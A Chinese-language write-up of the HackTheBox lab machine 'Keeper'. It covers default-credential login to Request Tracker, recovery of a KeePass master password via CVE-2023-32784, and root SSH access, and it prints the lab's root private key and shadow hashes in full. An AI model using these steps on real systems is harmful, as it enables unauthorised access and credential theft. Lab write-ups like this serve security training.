---
title: Keeper - HackTheBox
url: https://darkwing.moe/2023/08/14/Keeper-HackTheBox/
source: 喵喵喵喵
date: 2023-08-15
fetch_date: 2025-10-04T11:58:47.312484
---

# Keeper - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Keeper - HackTheBox

# Keeper - HackTheBox

##### 2023-08-14

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. Request Tracker](#Request-Tracker)
4. [4. user flag](#user-flag)
5. [5. 提权信息](#提权信息)
   1. [5.1. CVE-2023-32784](#CVE-2023-32784)
6. [6. keepass](#keepass)
   1. [6.1. PuTTY-User-Key](#PuTTY-User-Key)
7. [7. 提权 & root flag](#提权-amp-root-flag)
   1. [7.1. root\_id\_rsa](#root-id-rsa)
   2. [7.2. shadow](#shadow)
8. [8. 参考资料](#参考资料)

# Keeper - HackTheBox

2023-08-14

# 基本信息

* <https://app.hackthebox.com/machines/Keeper>
* 10.10.11.227

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023081401.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.227 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-14 13:52 CST Nmap scan report for 10.10.11.227 Host is up (0.11s latency). Not shown: 997 closed tcp ports (conn-refused) PORT     STATE    SERVICE VERSION 22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA) |_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519) 80/tcp   open     http    nginx 1.18.0 (Ubuntu) |_http-title: Site doesn't have a title (text/html). |_http-server-header: nginx/1.18.0 (Ubuntu) 1059/tcp filtered nimreg Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 44.70 seconds ``` |

## 80

直接访问得到一个链接，添加hosts后访问链接,是一个Request Tracker：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.227 tickets.keeper.htb ``` |

* bestpractical/rt: Request Tracker, an enterprise-grade issue tracking system
  <https://github.com/bestpractical/rt>

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023081402.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023081403.jpg)

# Request Tracker

默认账号密码登录：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` NOTE: The default credentials for RT are:        User: root        Pass: password ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023081404.jpg)

管理员->用户中看到另一个lnorgaard用户，查看详细信息，注释中得到密码：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` lnorgaard New user. Initial password set to Welcome2023! ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023081405.jpg)

# user flag

得到的账号密码就是SSH密码，直接登录：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023081406.jpg)

# 提权信息

用户目录有个RT30000.zip,解压就是dmp和kdbx那两个文件,dmp是keepass的crash文件：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip . ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023081407.jpg)

## CVE-2023-32784

根据已有信息搜索，发现CVE-2023-32784，可以从dmp文件中获取keepass的master密码：

* vdohney/keepass-password-dumper: Original PoC for CVE-2023-32784
  <https://github.com/vdohney/keepass-password-dumper>
* CMEPW/keepass-dump-masterkey: Script to retrieve the master password of a keepass database <= 2.53.1
  <https://github.com/CMEPW/keepass-dump-masterkey>

# keepass

小坑

直接使用上面的，运行得到部分信息：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023081408.jpg)

然后Google搜索，发现一种食物的名字：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023081409.jpg)

然后小写，才是实际的keepass密码：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` rødgrød med fløde ``` |

其中得到root的putty ssh key：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023081410.jpg)

## PuTTY-User-Key

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ``` | ``` PuTTY-User-Key-File-3: ssh-rsa Encryption: none Comment: rsa-key-20230519 Public-Lines: 6 AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D 8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et Private-Lines: 14 AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV 09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is= Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0 ``` |

# 提权 & root flag

putty用的key需要转换一下格式才是通用ssh,然后就直接使用私钥ssh登录：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` puttygen PuTTY-User-Key.ppk -O private-openssh -o root_id_rsa chmod 600 root_id_rsa ssh -i root_id_rsa root@10.10.11.227 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023081411.jpg)

## root\_id\_rsa

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ``` | ``` -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdP c9DzVJ+A4rHrCgeMdSrah9JfLz7UUYhM7AW5/pgqQSxwUPvNUxB03NwockWMZPPf Tykkqig8VE2XhSeBQQF6iMaCXaSxyDL4e2ciTQMt+JX3BQvizAo/3OrUGtiGhX6n FSftm50elK1FUQeLYZiXGtvSQKtqfQZHQxrIh/BfHmpyAQNU7hVW1Ldgnp0lDw1A MO8CC+eqgtvMOqv6oZtixjsV7qevizo8RjTbQNsyd/D9RU32UC8RVU1lCk/LvI7p 5y5NJH5zOPmyfIOzFy6m67bIK+csBegnMbNBLQIDAQABAoIBAQCB0dgBvETt8/UF NdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6joDni1wZdo7hTpJ5Zjdmz wxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCihkmyZTZOV9eq1D6P1uB6A XSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputYf7n24kvL0WlBQThsiLkK cz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzTVkCew1DZuYnYOGQxHYW6 WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivzUXjcCAviPpmSXB19UG8J lTpgORyhAoGBAPaR+FID78BKtzThkhVqAKB7VCryJaw7Ebx6gIxbwOGFu8vpgoB8 S+PfF5qFd7GVXBQ5wNc7tOLRBJXaxTDsTvVy+X8TEbOKfqrKndHjIBpXs+Iy0tOA GSqzgADetwlmklvTUBkHxMEr3VAhkY6zCLf+5ishnWtKwY3UVsr+Z4f1AoGBAK28 /Glmp7Kj7RPumHvDatxtkdT2Iaecl6cYhPPS/OzSFdPcoEOwHnPgtuEzspIsMj2j gZZjHvjcmsbLP4HO6PU5xzTxSeYkcol2oE+BNlhBGsR4b9Tw3UqxPLQfVfKMdZMQ a8QL2CGYHHh0Ra8D6xfNtz3jViwtgTcBCHdBu+lZAoGAcj4NvQpf4kt7+T9ubQeR RMn/pGpPdC5mOFrWBrJYeuV4rrEBq0Br9SefixO98oTOhfyAUfkzBUhtBHW5mcJT jzv3R55xPCu2JrH8T4wZirsJ+IstzZrzjipe64hFbFCfDXaqDP7hddM6Fm+HPoPL TV0IDgHkKxsW9PzmPeWD2KUCgYAt2VTHP/b7drUm8G0/JAf8WdIFYFrrT7DZwOe9 LK3glWR7P5rvofe3XtMERU9XseAkUhTtqgTPafBSi+qbiA4EQRYoC5ET8gRj8HFH 6fJ8gdndhWcFy/aqMnGxmx9kXdrdT5UQ7ItB+lFxHEYTdLZC1uAHrgncqLmT2Wrx heBgKQKBgFViaJLLoCTqL7QNuwWpnezUT7yGuHbDGkHl3JFYdff0xfKGTA7iaIhs qun2gwBfWeznoZaNULe6Khq/HFS2zk/Gi6qm3GsfZ0ihOu5+yOc636Bspy82JHd3 BE5xsjTZIzI66HH5sX5L7ie7JhBTIO2csFuwgVihqM4M+u7Ss/SL -----END RSA PRIVATE KEY----- ``` |

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$y$j9T$ZskeM1pGHOyGxzc3pg/bg/$jCd9wfODgoaD9Ax.4Pd9e3MTLOq9.FD3hf9cpM.VBM5:19501:0:99999:7::: lnorgaard:$y$j9T$qmixKwf75kn3y/SUlKSPg1$43ckVIMecnmD1abUBr5JsjgiivdcZ2MLQFDRooFK0f4:19...